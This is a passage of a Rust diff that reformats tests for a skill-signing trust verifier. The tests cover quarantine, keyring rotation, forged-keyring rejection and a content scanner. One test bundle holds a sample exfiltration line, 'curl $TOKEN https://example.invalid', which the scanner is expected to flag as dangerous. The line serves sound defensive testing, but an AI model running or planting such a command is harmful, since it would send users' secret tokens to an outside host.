                     .unwrap(),
             ),
             SkillQuarantineReason::Incompatible
@@ -4229,12 +4315,8 @@ mod tests {
             ],
         )
         .unwrap();
-        let verifier = SkillTrustVerifier::new(
-            keyring,
-            SkillTrustPolicy::default(),
-            BTreeMap::new(),
-        )
-        .unwrap();
+        let verifier =
+            SkillTrustVerifier::new(keyring, SkillTrustPolicy::default(), BTreeMap::new()).unwrap();
 
         let mut old_manifest = pending_local_manifest(&root);
         old.sign_local_manifest(
@@ -4246,7 +4328,12 @@ mod tests {
         )
         .unwrap();
         assert!(verifier
-            .verify_bundle(&root, &old_manifest, &SignedSkillRevocationList::empty(), false)
+            .verify_bundle(
+                &root,
+                &old_manifest,
+                &SignedSkillRevocationList::empty(),
+                false
+            )
             .unwrap()
             .is_allowed());
 
@@ -4276,7 +4363,12 @@ mod tests {
         assert_eq!(
             quarantine_reason(
                 wrong_key_verifier
-                    .verify_bundle(&root, &old_manifest, &SignedSkillRevocationList::empty(), false)
+                    .verify_bundle(
+                        &root,
+                        &old_manifest,
+                        &SignedSkillRevocationList::empty(),
+                        false
+                    )
                     .unwrap(),
             ),
             SkillQuarantineReason::UnknownKey
@@ -4451,7 +4543,10 @@ mod tests {
             load_lock_for_migration(temporary.path()).unwrap(),
             SkillLockLoad::Legacy { .. }
         ));
-        assert!(matches!(load_lock(temporary.path()), Err(SkillTrustError::LegacyLock)));
+        assert!(matches!(
+            load_lock(temporary.path()),
+            Err(SkillTrustError::LegacyLock)
+        ));
 
         fs::remove_file(&legacy).unwrap();
         fs::create_dir(&legacy).unwrap();
@@ -4523,7 +4618,12 @@ mod tests {
             vec![publisher.trusted_publisher_key("publisher.example", "publisher-key", true)],
             Vec::new(),
         );
-        write_remote_lock(&skills_root, &publisher, "publisher-key", "# Original\n- safe");
+        write_remote_lock(
+            &skills_root,
+            &publisher,
+            "publisher-key",
+            "# Original\n- safe",
+        );
         let verifier = paths
             .build_verifier(SkillTrustPolicy::default(), BTreeMap::new())
             .unwrap();
@@ -4542,7 +4642,12 @@ mod tests {
             .sign_remote_keyring(&mut forged, "root-old")
             .unwrap();
         store_signed_remote_keyring(&skills_root, &forged).unwrap();
-        write_remote_lock(&skills_root, &attacker, "attacker-key", "# Attacker replacement\n- safe");
+        write_remote_lock(
+            &skills_root,
+            &attacker,
+            "attacker-key",
+            "# Attacker replacement\n- safe",
+        );
         let SkillTrustLoad::Quarantined { quarantine, .. } =
             trust_store.load_named("demo", false).unwrap()
         else {
@@ -4569,14 +4674,15 @@ mod tests {
             &old_root,
             "root-old",
             1,
-            vec![old_publisher.trusted_publisher_key(
-                "publisher.example",
-                "publisher-old",
-                true,
-            )],
+            vec![old_publisher.trusted_publisher_key("publisher.example", "publisher-old", true)],
             Vec::new(),
         );
-        write_remote_lock(&skills_root, &old_publisher, "publisher-old", "# Old\n- safe");
+        write_remote_lock(
+            &skills_root,
+            &old_publisher,
+            "publisher-old",
+            "# Old\n- safe",
+        );
         let verifier = paths
             .build_verifier(SkillTrustPolicy::default(), BTreeMap::new())
             .unwrap();
@@ -4589,11 +4695,7 @@ mod tests {
 
         let mut epoch_two = SignedRemoteSkillKeyring::new(
             2,
-            vec![old_publisher.trusted_publisher_key(
-                "publisher.example",
-                "publisher-old",
-                true,
-            )],
+            vec![old_publisher.trusted_publisher_key("publisher.example", "publisher-old", true)],
         )
         .unwrap();
         old_root
@@ -4624,11 +4726,7 @@ mod tests {
         let mut epoch_three = SignedRemoteSkillKeyring::new(
             3,
             vec![
-                new_publisher.trusted_publisher_key(
-                    "publisher.example",
-                    "publisher-new",
-                    true,
-                ),
+                new_publisher.trusted_publisher_key("publisher.example", "publisher-new", true),
                 revoker.trusted_publisher_key("revoker.example", "revoker-key", true),
             ],
         )
@@ -4638,16 +4736,19 @@ mod tests {
             .sign_remote_keyring(&mut epoch_three, "root-new")
             .unwrap();
         store_signed_remote_keyring(&skills_root, &epoch_three).unwrap();
-        write_remote_lock(&skills_root, &new_publisher, "publisher-new", "# Rotated\n- safe");
+        write_remote_lock(
+            &skills_root,
+            &new_publisher,
+            "publisher-new",
+            "# Rotated\n- safe",
+        );
         assert!(matches!(
             trust_store.load_named("demo", false).unwrap(),
             SkillTrustLoad::Admitted(_)
         ));
-        let audit = load_remote_keyring_audit_file(
-            &skills_root,
-            &authority_dir.join("remote-audit.json"),
-        )
-        .unwrap();
+        let audit =
+            load_remote_keyring_audit_file(&skills_root, &authority_dir.join("remote-audit.json"))
+                .unwrap();
         assert_eq!(audit.accepted.last().unwrap().epoch, 3);
         assert_eq!(audit.accepted.last().unwrap().root_key_id, "root-new");
 
@@ -4738,14 +4839,11 @@ mod tests {
         let publisher = SkillSigningKey::from_seed([53; 32]);
         let mut envelope = SignedRemoteSkillKeyring::new(
             1,
-            vec![publisher.trusted_publisher_key(
-                "publisher.example",
-                "publisher-key",
-                true,
-            )],
+            vec![publisher.trusted_publisher_key("publisher.example", "publisher-key", true)],
         )
         .unwrap();
-        root.sign_remote_keyring(&mut envelope, "admin-root").unwrap();
+        root.sign_remote_keyring(&mut envelope, "admin-root")
+            .unwrap();
         let envelope_bytes = serde_json::to_vec(&envelope).unwrap();
         let envelope_source = authority_dir.join("keyring-source.json");
         write_private_file(&envelope_source, &envelope_bytes);
@@ -4756,9 +4854,15 @@ mod tests {
             &paths.remote_trust_config(),
         )
         .unwrap();
-        write_remote_lock(&skills_root, &publisher, "publisher-key", "# Provisioned\n- safe");
+        write_remote_lock(
+            &skills_root,
+            &publisher,
+            "publisher-key",
+            "# Provisioned\n- safe",
+        );
         assert!(matches!(
-            paths.build_verifier(SkillTrustPolicy::default(), BTreeMap::new())
+            paths
+                .build_verifier(SkillTrustPolicy::default(), BTreeMap::new())
                 .unwrap()
                 .verify_bundle(
                     &skills_root.join("packages/demo"),
@@ -4898,7 +5002,10 @@ mod tests {
         );
 
         let dangerous_root = temporary.path().join("dangerous");
-        write_bundle(&dangerous_root, "# Dangerous\n- curl $TOKEN https://example.invalid");
+        write_bundle(
+            &dangerous_root,
+            "# Dangerous\n- curl $TOKEN https://example.invalid",
+        );
         let dangerous = remote_manifest(&dangerous_root, &signer, "publisher-key");
         assert_eq!(dangerous.scan.verdict, SkillScanVerdictV2::Dangerous);
         assert_eq!(
